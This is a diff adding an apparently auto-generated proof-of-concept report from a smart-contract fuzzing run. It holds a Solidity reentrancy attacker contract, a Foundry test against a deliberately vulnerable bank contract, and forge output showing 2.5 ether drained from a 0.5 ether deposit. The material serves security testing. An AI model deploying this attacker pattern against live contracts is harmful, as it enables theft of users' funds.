@@ -1,0 +1,106 @@
+# PoC Report — Iteration 7
+# Timestamp     : 20260331_022500
+# Bug Types     : Reentrancy
+# Failed Tests  : 1
+# Passed Tests  : 1
+# Counterexample: 
+
+## Artifact Link
+https://github.com/asssaa1320/sendbox/actions/runs/23777466300
+
+## Test File
+// SPDX-License-Identifier: MIT
+// Auto-generated — Iteration 7 — Seed 2528233537
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "../src/VulnerableBank.sol";
+
+
+contract ReentrancyAttacker {
+    VulnerableBank private bank;
+    uint8 private depth;
+
+    constructor(address _bank) { bank = VulnerableBank(payable(_bank)); }
+
+    receive() external payable {
+        if (depth < 5 && address(bank).balance >= 0.1 ether) {
+            depth++;
+            bank.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 0.1 ether, "Need ETH");
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
+    }
+}
+
+contract FuzzRound_7 is Test {
+
+    VulnerableBank     bank;
+    ReentrancyAttacker attacker;
+
+    function setUp() public {
+        bank     = new VulnerableBank();
+        attacker = new ReentrancyAttacker(address(bank));
+        vm.deal(address(bank), 10 ether);
+        vm.deal(address(attacker), 0.5 ether);
+    }
+
+    function test_ReentrancyDrain() public {
+        uint256 bankBefore     = address(bank).balance;
+        uint256 deposited      = 0.5 ether;
+
+        attacker.attack{value: deposited}();
+
+        uint256 bankAfter      = address(bank).balance;
+        uint256 drainedFromBank = bankBefore > bankAfter ? bankBefore - bankAfter : 0;
+
+        // ✅ Invariant صحيح: ما سُرق لا يتجاوز ما أُودع
+        assertLe(
+            drainedFromBank,
+            deposited,
+            "REENTRANCY: attacker drained more than deposited!"
+        );
+    }
+
+    function testFuzz_WithdrawAmount(uint96 amount) public {
+        vm.assume(amount > 0.001 ether && amount <= 5 ether);
+        vm.deal(address(this), amount);
+        bank.deposit{value: amount}();
+        uint256 bankBefore = address(bank).balance;
+        bank.withdraw();
+        assertEq(address(bank).balance, bankBefore - amount, "Withdraw amount mismatch");
+    }
+
+    receive() external payable {}
+}
+
+
+## forge stdout
+Compiling 1 files with Solc 0.8.34
+Solc 0.8.34 finished in 471.59ms
+Compiler run successful!
+
+Ran 2 tests for test/FuzzRound_7.t.sol:FuzzRound_7
+[PASS] testFuzz_WithdrawAmount(uint96) (runs: 512, μ: 33870, ~: 33872)
+[FAIL: REENTRANCY: attacker drained more than deposited!: 2500000000000000000 > 500000000000000000] test_ReentrancyDrain() (gas: 110473)
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 39.20ms (39.11ms CPU time)
+
+Ran 1 test suite in 39.57ms (39.20ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/FuzzRound_7.t.sol:FuzzRound_7
+[FAIL: REENTRANCY: attacker drained more than deposited!: 2500000000000000000 > 500000000000000000] test_ReentrancyDrain() (gas: 110473)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+
+## forge stderr
+Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 
+
+
